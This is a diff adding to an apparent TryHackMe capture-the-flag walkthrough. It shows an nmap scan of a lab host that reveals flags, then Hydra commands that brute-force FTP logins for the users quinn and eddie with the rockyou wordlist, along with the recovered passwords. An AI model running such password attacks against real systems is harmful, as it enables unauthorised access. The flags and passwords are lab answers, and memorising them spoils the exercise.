@@ -35,3 +35,104 @@ Port 10121 found!
 
 Lets do a more in depth scan now to see more of the hidden information 
 nmap -sV -sC -p- --open 10.130.176.34
+
+Results: 
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         (protocol 2.0)
+| ssh-hostkey: 
+|   3072 67:17:fd:37:83:a1:f6:01:e6:23:e6:27:fe:0c:33:fc (RSA)
+|   256 3d:c7:b7:ba:db:51:e1:71:ef:21:a9:4d:ce:ac:62:c6 (ECDSA)
+|_  256 ac:6e:86:a5:f4:7c:de:77:15:57:7d:45:08:41:aa:0c (ED25519)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
+80/tcp    open  http        THM{MySpecialServer007}
+|_http-title: Welcome
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html
+|     Content-Length: 341
+|     Connection: close
+|     Date: Fri, 20 Nov 2026 20:54:44 GMT
+|     Server: THM{MySpecialServer007}
+|     <?xml version="1.0" encoding="iso-8859-1"?>
+|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+|     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+|     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+|     <head>
+|     <title>404 Not Found</title>
+|     </head>
+|     <body>
+|     <h1>404 Not Found</h1>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Vary: Accept-Encoding
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     ETag: "575357650"
+|     Last-Modified: Tue, 24 Feb 2026 06:00:52 GMT
+|     Content-Length: 220
+|     Connection: close
+|     Date: Fri, 20 Nov 2026 20:54:38 GMT
+|     Server: THM{MySpecialServer007}
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <title>Welcome</title>
+|     <meta charset="UTF-8" />
+|     <meta name="viewport" content="width=device-width,initial-scale=1" />
+|     </head>
+|     <body>
+|     <h1>Hello, world!</h1>
+|     </body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: OPTIONS, GET, HEAD, POST
+|     Content-Length: 0
+|     Connection: close
+|     Date: Fri, 20 Nov 2026 20:54:39 GMT
+|     Server: THM{MySpecialServer007}
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Content-Length: 345
+|     Connection: close
+|     Date: Fri, 20 Nov 2026 20:54:39 GMT
+|     Server: THM{MySpecialServer007}
+|     <?xml version="1.0" encoding="iso-8859-1"?>
+|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+|     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+|     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+|     <head>
+|     <title>400 Bad Request</title>
+|     </head>
+|     <body>
+|     <h1>400 Bad Request</h1>
+|     </body>
+|_    </html>
+|_http-server-header: THM{MySpecialServer007}
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+8081/tcp  open  http        Node.js (Express middleware)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+10001/tcp open  scp-config?
+10121/tcp open  ftp         vsftpd 3.0.5
+
+ssh header flag found THM{946219583339}!
+version of ftp server found vsftpd 3.0.5!
+
+Now time to get the FTP passwords for the accounts eddit and quinn using Hydra
+We have to make sure our target is aimed at port 10121 as that port hosts ftp 
+
+hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.130.176.34:10121
+hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.130.176.34:10121
+
+Results: 
+
+host: 10.130.176.34   login: quinn   password: cookie
+host: 10.130.176.34   login: eddie   password: softball
